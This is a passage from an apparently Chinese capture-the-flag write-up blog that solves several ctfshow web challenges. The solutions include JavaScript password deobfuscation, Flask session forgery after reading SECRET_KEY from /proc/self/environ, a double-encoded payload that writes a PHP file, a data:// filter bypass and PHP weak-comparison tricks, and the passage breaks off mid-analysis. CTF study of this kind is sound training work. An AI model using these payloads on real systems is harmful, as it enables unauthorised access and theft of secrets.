language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xc&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x7</span>,<span class="hljs-number">0x9</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0xe</span>,<span class="hljs-number">0x10</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>))<span class="hljs-keyword">return</span>!![];&#125;&#125;&#125;&#125;&#125;&#125;&#125;<span class="hljs-keyword">return</span>![];&#125;<br></code></pre></td></tr></table></figure>

<p><a href="https://www.sojson.com/jsjiemi.html">在线解密</a>后js代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> _0x575c = [<span class="hljs-string">&#x27;2-4&#x27;</span>, <span class="hljs-string">&#x27;substring&#x27;</span>, <span class="hljs-string">&#x27;4-7&#x27;</span>, <span class="hljs-string">&#x27;getItem&#x27;</span>, <span class="hljs-string">&#x27;deleteItem&#x27;</span>, <span class="hljs-string">&#x27;12-14&#x27;</span>, <span class="hljs-string">&#x27;0-2&#x27;</span>, <span class="hljs-string">&#x27;setItem&#x27;</span>, <span class="hljs-string">&#x27;9-12&#x27;</span>, <span class="hljs-string">&#x27;^7M&#x27;</span>, <span class="hljs-string">&#x27;updateItem&#x27;</span>, <span class="hljs-string">&#x27;bb=&#x27;</span>, <span class="hljs-string">&#x27;7-9&#x27;</span>, <span class="hljs-string">&#x27;14-16&#x27;</span>, <span class="hljs-string">&#x27;localStorage&#x27;</span>, ];<br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4f0aae, _0x575cf8</span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x51eea2 = <span class="hljs-keyword">function</span>(<span class="hljs-params">_0x180eeb</span>) &#123;<br>        <span class="hljs-keyword">while</span> (--_0x180eeb) &#123;<br>            _0x4f0aae[<span class="hljs-string">&#x27;push&#x27;</span>](_0x4f0aae[<span class="hljs-string">&#x27;shift&#x27;</span>]());<br>        &#125;<br>    &#125;;<br>    <span class="hljs-title function_">_0x51eea2</span>(++_0x575cf8);<br>&#125;(_0x575c, <span class="hljs-number">0x78</span>));<br><span class="hljs-keyword">var</span> _0x51ee = <span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4f0aae, _0x575cf8</span>) &#123;<br>    _0x4f0aae = _0x4f0aae - <span class="hljs-number">0x0</span>;<br>    <span class="hljs-keyword">var</span> _0x51eea2 = _0x575c[_0x4f0aae];<br>    <span class="hljs-keyword">return</span> _0x51eea2;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckPassword</span>(<span class="hljs-params">_0x47df21</span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x4bbdc3 = [<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xe&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x3&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x7&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x4&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>)];<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;9-12&#x27;</span>, <span class="hljs-string">&#x27;BE*&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xb&#x27;</span>));<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>), <span class="hljs-string">&#x27;5W&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x9&#x27;</span>));<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>), <span class="hljs-string">&#x27;pg&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;7-9&#x27;</span>, <span class="hljs-string">&#x27;+n&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>), <span class="hljs-string">&#x27;4t&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>), <span class="hljs-string">&#x27;$F&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x8&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x9</span>, <span class="hljs-number">0xc</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>)) === _0x47df21[<span class="hljs-string">&#x27;substring&#x27;</span>](<span class="hljs-number">0x4</span>, <span class="hljs-number">0x7</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x0</span>, <span class="hljs-number">0x2</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-string">&#x27;16&#x27;</span>) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x10</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0xc</span>, <span class="hljs-number">0xe</span>)) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xc&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x7</span>, <span class="hljs-number">0x9</span>)) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0xe</span>, <span class="hljs-number">0x10</span>)) &#123;<br>                                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x2</span>, <span class="hljs-number">0x4</span>)) <span class="hljs-keyword">return</span> !![];<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ![];<br>&#125;<br></code></pre></td></tr></table></figure>


<p>可以看到密码被拆分成很多部分，且顺序被打乱了，但是元素赋值和检查密码的顺序是一样的</p>
<p>先看第一个：<code>if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#39;0x8&#39;)) === _0x47df21[_0x51ee(&#39;0x1&#39;)](9, 12))</code>对应的就是9-12位是<code>window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#39;9-12&#39;, &#39;BE*&#39;);</code>，值为’BE*’</p>
<p>第二个：<code>if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#39;0x2&#39;)) === _0x47df21[&#39;substring&#39;](4, 7)) &#123;</code>密码的4-7位就是<code>window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#39;0x2&#39;), _0x51ee(&#39;0xb&#39;));</code>,值为<code>_0x51ee(&#39;0xb&#39;)</code></p>
<p>其他的以此类推<br>但是有两个特殊的地方，第4-7和第16<br>第4-7值为<code>_0x51ee(&#39;0xb&#39;)</code>，对应的是<code>_0x575c</code>数组的第11位,值为<code>bb=</code><br>第16值为<code>_0x51ee(&#39;0x9&#39;)</code>，对应的是<code>_0x575c</code>数组的第9为，值为<code>^7M</code></p>
<p>我的分析过程图：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/WEB732.jpg"></p>
<h1 id="WEB736"><a href="#WEB736" class="headerlink" title="WEB736"></a>WEB736</h1><p>题目出自[PASECA2019]honey_shop</p>
<p>打开题目，是一个商店，还有一个价值$1337的flag，但我们只有$1336<br>所以这一题的目标应该是修改价格来购买flag了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web736-1.jpg"></p>
<p>抓包可以看到session的值<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web736-2.jpg"></p>
<p>通过脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">payload</span>):<br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))<br></code></pre></td></tr></table></figure>
<p>得到<code>&#123;&#39;balance&#39;: 1336, &#39;purchases&#39;: []&#125;</code><br>其中balance为当前余额，purchases值为空<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web736-3.jpg"></p>
<p>如果我们要伪造<code>session</code>，修改余额，那么就需要知道<code>SECRET_KEY</code>的值</p>
<p>页面中还有一个提示<code>*click to download our sweet images*</code><br>下载后格式为<code>/download?image=</code>，这种格式容易造成任意文件读取</p>
<p>读取环境变量中的<code>python版本</code>和<code>SECRET_KEY</code></p>
<blockquote>
<p>&#x2F;proc&#x2F;self&#x2F;environ:当前正在运行的进程的环境变量列表</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web736-4.jpg"></p>
<p>拿到<code>SECRET_KEY</code>后就可以进行session伪造了<br>要注意python3和python2的结果不一样，所以上一步读了python的版本<br><a href="https://github.com/noraj/flask-session-cookie-manager">脚本地址</a></p>
<p>修改金额后进行伪造<br><code>python flask_session_cookie_manager3.py encode -s &quot;ctfshowsecretkeyhereyouneverknow&quot; -t &quot;&#123;&#39;balance&#39;: 1337, &#39;purchases&#39;: []&#125;&quot; </code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web736-5.jpg"></p>
<p>再次购买，购买成功<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web736-6.jpg"></p>
<h1 id="WEB743"><a href="#WEB743" class="headerlink" title="WEB743"></a>WEB743</h1><p>F12</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-variable">$d</span> &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$d</span>))<br>                &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125;<br>            &#125;<br>        --&gt;<br></code></pre></td></tr></table></figure>
<p>简单弱比较，传数组<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web743.jpg"></p>
<h1 id="WEB756"><a href="#WEB756" class="headerlink" title="WEB756"></a>WEB756</h1><p>&#x2F;source.txt得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$code</span>);&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>这一题重点是理解<code>$$code</code>；</p>
<p>举个例子<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/WEB756-1.jpg"><br><code>$$b</code>其实相当于<code>$($b)</code>,所以会输出1</p>
<p>理解后很容易想到php中自带的变量之一<code>$GLOBALS</code><br>传入后就会以数组的形式返回值，得到flag</p>
<h1 id="WEB758"><a href="#WEB758" class="headerlink" title="WEB758"></a>WEB758</h1><p>&#x2F;source.txt得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;./spider/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>,<span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>) === <span class="hljs-number">0</span>) || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>,<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>) === <span class="hljs-number">0</span>)&#123;<br>  <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;文件保存在<span class="hljs-subst">$file</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>首先限制了开头的字符串必须是<code>http://127.0.0.1/</code>或<code>https://www.baidu.com/</code><br>然后从<code>$url</code>获取内容然后写入<code>$file</code></p>
<p>首先传入<code>?url=http://127.0.0.1/&amp;file=&lt;?php phpinfo();?&gt;</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/WEB758-1.jpg"><br>看到成功保存了<br>那么我们可以将这个内容再次保存到文件中</p>
<p>即<code>?url=http://127.0.0.1/?url=http://127.0.0.1/&amp;file=&lt;?php phpinfo();?&gt;&amp;file=1.php</code></p>
<p>但是要注意的是要因为访问两次所以url编码两次</p>
<p>所以payload为<code>?url=http://127.0.0.1/?url=http://127.0.0.1/%26file=%253C%253Fphp%2520phpinfo%2528%2529%253B%2520%253F%253E&amp;file=1.php</code></p>
<p>访问1.php就行了</p>
<h1 id="WEB760"><a href="#WEB760" class="headerlink" title="WEB760"></a>WEB760</h1><p>F12</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">CTFSHOW hint:<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;\.&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;[0-9]&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>]) ) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;https&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>]) ) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;ftp&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;telnet&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smile</span>) &#123;<br>                      <span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">file_exists</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  &#125;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smile</span>) &#123;<br>                    <span class="hljs-variable">$smile</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>]);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smile</span> === <span class="hljs-string">&quot;(●&#x27;◡&#x27;●)&quot;</span>) <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>                  &#125;<br></code></pre></td></tr></table></figure>

<p><code>$_SERVER[&quot;QUERY_STRING&quot;]</code> 获取的是?后面的值,比如<code>http://localhost/aaa/index.php?p=222&amp;q=333</code>中<code>$_SERVER[&#39;QUERY_STRING&#39;] = &quot;p=222&amp;q=333&quot;;</code></p>
<p><code>$_GET[&#39;^_^&#39;]</code>就包含了<code>_</code>，但是<code>$_SERVER[&quot;QUERY_STRING&quot;]</code>却不允许有<code>_</code>,这是矛盾的</p>
<p>在php中变量名中的点和空格会被转换成下划线。例如 <code>&lt;input name=&quot;a.b&quot; /&gt;</code> 变成了 <code>$_REQUEST[&quot;a_b&quot;]</code><br>这样我们可以传入<code>^.^</code>来绕过</p>
<p><code>file_exists</code>判断文件是否存在，这里必须不存在，但是却要<code>file_get_contents</code>读到文件内容</p>
<p>因为<code>http</code>等协议被禁用，所以不能远程包含了，这里采用<code>data://</code>来读取</p>
<p>而且file_exists 对于 data 指向内容判断为不存在<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/WEB760.jpg"></p>
<p>最终的payload为：<code>?^.^=data://text/plain,(●&#39;◡&#39;●)</code>或<code>?^.^=data://text/plain;charset=unicode,(●&#39;◡&#39;●)</code></p>
<h1 id="WEB761"><a href="#WEB761" class="headerlink" title="WEB761"></a>WEB761</h1><p>F12</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$value</span>))&#123;<br>                  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125;<br></code></pre></td></tr></table></figure>
<p>百度一个0e开头的值，且这个值md5后还是0e开头<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web761.jpg"></p>
<h1 id="WEB764"><a href="#WEB764" class="headerlink" title="WEB764"></a>WEB764</h1><p>source.txt看到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$login</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!@<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>])||<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>] != @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>],<span class="hljs-number">17</span>,<span class="hljs-number">7</span>));<br>      <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php \$flag=&quot;</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br>      <span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;.php&quot;</span>;<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span>);<br>      <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] == <span class="hljs-title function_ invoke__">mt_rand</span>())<br>      &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>($&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-title function_ invoke__">mt_rand</span>()]&#125;);<br>      &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>第一个if判断：<br>因为<code>!isset($login[&#39;cookie&#39;])</code>肯定为false<br>所以要满足<code>$login[&#39;cookie&#39;]</code>与<code>md5($_SESSION[&#39;flag&#39;])</code>相等</p>
<p>在本地跑出<code>md5($_SESSION[&#39;flag&#39;])</code>结果为<code>d41d8cd98f00b204e9800998ecf8427e</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>根据题目传<code>?id[cookie]=d41d8cd98f00b204e9800998ecf8427e</code>,不在返回error</p>
<p>else内容分析：<br>以cookie中第17位开始向后7位,播种随机数生成器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>],<span class="hljs-number">17</span>,<span class="hljs-number">7</span>));<br></code></pre></td></tr></table></figure>

<p>拼接字符串和flag，赋给<code>$content</code></p>
